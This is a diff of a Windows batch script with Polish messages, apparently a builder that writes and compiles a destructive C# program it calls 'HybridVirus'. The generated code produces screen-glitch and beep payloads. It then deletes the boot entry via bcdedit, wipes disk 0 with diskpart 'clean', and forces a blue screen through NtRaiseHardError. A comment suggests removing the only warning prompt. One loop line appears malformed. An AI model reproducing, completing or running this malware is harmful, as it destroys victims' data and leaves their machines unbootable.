@@ -1,81 +1,101 @@
 @echo off
 net session >nul 2>&1
 if %errorLevel% neq 0 (
-    echo [!] BLAD: Musisz kliknac PRAWYM i wybrac "Uruchom jako administrator".
+    echo [!] BLAD: Musisz uruchomic ten plik jako ADMINISTRATOR.
     pause
     exit
 )
 
-title LOL-MAIN BUILDER FIX
-color 0E
+title HYBRID VIRUS COMPILER (MEMZ + SAILEWIN)
+color 0C
 
-:: Ustawienie folderu
-set "targetDir=%userprofile%\Desktop\lol-main"
-if not exist "%targetDir%" mkdir "%targetDir%"
-cd /d "%targetDir%"
+:: Lokalizacja robocza
+set "workDir=%userprofile%\Desktop\lol-main"
+if not exist "%workDir%" mkdir "%workDir%"
+cd /d "%workDir%"
 
-echo [*] Etap 1: Sprawdzanie srodowiska...
-dotnet --version >nul 2>&1
-if %errorLevel% neq 0 (
-    echo [!] Brak .NET. Pobieranie instalatora...
-    powershell -Command "Invoke-WebRequest -Uri 'https://dot.net/v1/dotnet-install.ps1' -OutFile 'dotnet-install.ps1'"
-    powershell -ExecutionPolicy Bypass -File "dotnet-install.ps1" -Channel 6.0 -InstallDir "%targetDir%\dotnet"
-    :: Dodajemy do PATH na sztywno dla tej sesji
-    set "PATH=%PATH%;%targetDir%\dotnet"
-)
-echo [+] .NET GOTOWY.
+echo [*] Generowanie kodu zrodlowego C#...
 
-echo [*] Etap 2: Czyszczenie i tworzenie projektu...
-:: Usuwamy stare pliki, jesli istnieja, zeby nie bylo konfliktow
-if exist "Virus.csproj" del /f /q "Virus.csproj"
-if exist "Program.cs" del /f /q "Program.cs"
-
-:: Tworzymy nowy projekt bez zbednych komunikatow
-dotnet new winforms --force --name "Virus" >nul
-echo [+] PROJEKT UTWORZONY.
-
-echo [*] Etap 3: Wstrzykiwanie kodu...
 (
 echo using System;
 echo using System.Drawing;
 echo using System.Runtime.InteropServices;
 echo using System.Threading;
 echo using System.Windows.Forms;
+echo using System.Diagnostics;
+echo using Microsoft.Win32;
 echo.
-echo class Hybrid {
-echo     [DllImport("user32.dll")] static extern IntPtr GetDC(IntPtr h^);
-echo     [DllImport("gdi32.dll")] static extern bool BitBlt(IntPtr hD, int x, int y, int w, int h, IntPtr hS, int sx, int sy, uint op^);
-echo     [DllImport("user32.dll")] static extern int GetSystemMetrics(int n^);
+echo public class FinalVirus {
+echo     [DllImport("user32.dll")] public static extern IntPtr GetDC(IntPtr h^);
+echo     [DllImport("gdi32.dll")] public static extern bool BitBlt(IntPtr hD, int x, int y, int w, int h, IntPtr hS, int sx, int sy, uint op^);
+echo     [DllImport("user32.dll")] public static extern int GetSystemMetrics(int n^);
+echo     [DllImport("ntdll.dll")] public static extern uint RtlAdjustPrivilege(int p, bool e, bool c, out bool o^);
+echo     [DllImport("ntdll.dll")] public static extern uint NtRaiseHardError(uint h, uint a, uint b, IntPtr c, uint d, out uint e^);
 echo.
 echo     [STAThread]
-echo     static void Main(^) {
-echo         new Thread((^) =^> { while(true) { Console.Beep(new Random(^).Next(400, 900^), 100^); Thread.Sleep(300^); } }).Start(^);
+echo     public static void Main(^) {
+echo         // 1. OSTRZEZENIE (Opcjonalne - mozesz usunac te 2 linie, zeby startowal od razu)
+echo         if (MessageBox.Show("URUCHOMIC HYBRYDE? SYSTEM ZOSTANIE ZNISZCZONY.", "ALARM", MessageBoxButtons.YesNo^) == DialogResult.No^) return;
+echo.
+echo         // 2. PAYLOADY (Dzwiek i GDI)
+echo         new Thread(PayloadGDI^).Start(^);
+echo         new Thread(PayloadAudio^).Start(^);
+echo.
+echo         // 3. CZAS DO AUTODESTRUKCJI (120 sekund)
+echo         Thread.Sleep(120000^);
+echo.
+echo         // 4. KILL SYSTEM (UEFI/MBR/REGISTRY)
+echo         Destruction(^);
+echo     }
+echo.
+echo     static void PayloadGDI(^) {
 echo         IntPtr hdc = GetDC(IntPtr.Zero^);
 echo         int w = GetSystemMetrics(0^), h = GetSystemMetrics(1^);
 echo         Random r = new Random(^);
-echo         while(true) {
-echo             BitBlt(hdc, r.Next(-8, 9^), r.Next(-8, 9^), w, h, hdc, 0, 0, 0x00CC0020^);
-echo             if(r.Next(10^) ^> 7^) Graphics.FromHdc(hdc^).DrawIcon(SystemIcons.Error, r.Next(w^), r.Next(h^)^);
-echo             Thread.Sleep(10^);
+echo         while(true^ step^) {
+echo             BitBlt(hdc, r.Next(-10, 11^), r.Next(-10, 11^), w, h, hdc, 0, 0, 0x00CC0020^); // Shake
+echo             if(r.Next(100^) ^> 95^) BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, 0x00660046^); // Invert
+echo             if(r.Next(10^) ^> 8^) Graphics.FromHdc(hdc^).DrawIcon(SystemIcons.Error, r.Next(w^), r.Next(h^)^); // Errors
+echo             Thread.Sleep(15^);
 echo         }
 echo     }
-echo }
-) > Program.cs
-echo [+] KOD WSTRZYKNIETY.
-
-echo [*] Etap 4: Kompilacja (to moze potrwac)...
-dotnet build -c Release
-if %errorLevel% neq 0 (
-    echo [!] BLAD KOMPILACJI! Sprawdz powyzsze bledy.
-    pause
-    exit
-)
-
-echo [*] Etap 5: Finalizacja...
-:: Szukamy pliku exe i kopiujemy na Desktop/lol-main
-copy /y "bin\Release\net6.0-windows\Virus.exe" "ShitVirus.exe"
 echo.
-echo ===================================================
-echo   SUKCES! Plik ShitVirus.exe jest w folderze lol-main.
-echo ===================================================
+echo     static void PayloadAudio(^) {
+echo         Random r = new Random(^);
+echo         while(true^) { Console.Beep(r.Next(200, 2000^), 100^); Thread.Sleep(r.Next(500, 2000^)^); }
+echo     }
+echo.
+echo     static void Destruction(^) {
+echo         try {
+echo             // Usuniecie wpisu rozruchowego (Niszczenie sciezki do systemu)
+echo             Process.Start(new ProcessStartInfo("bcdedit", "/delete {current} /f"^) { WindowStyle = ProcessWindowStyle.Hidden }^);
+echo.
+echo             // Czyszczenie partycji (Diskpart)
+echo             string s = "select disk 0\nclean";
+echo             System.IO.File.WriteAllText("s.txt", s^);
+echo             Process.Start(new ProcessStartInfo("diskpart", "/s s.txt"^) { WindowStyle = ProcessWindowStyle.Hidden }^);
+echo.
+echo             // Wywolanie BSOD (Critical Error)
+echo             bool o; uint e;
+echo             RtlAdjustPrivilege(19, true, false, out o^);
+echo             NtRaiseHardError(0xC0000022, 0, 0, IntPtr.Zero, 6, out e^);
+echo         } catch { Process.Start("cmd.exe", "/c taskkill /f /im svchost.exe"^); }
+echo     }
+echo }
+) > source.cs
+
+echo [*] Szukanie kompilatora w systemie...
+set "csc=C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
+if not exist "%csc%" set "csc=C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"
+
+echo [*] Kompilacja Hybrydy...
+"%csc%" /target:winexe /out:HybridVirus.exe /r:System.Windows.Forms.dll /r:System.Drawing.dll /r:System.dll source.cs
+
+if %errorLevel% equ 0 (
+    echo.
+    echo [+] GOTOWE! Plik HybridVirus.exe znajduje sie w lol-main.
+    echo [+] Plik source.cs mozesz usunac.
+) else (
+    echo [!] BLAD KOMPILACJI.
+)
 pause
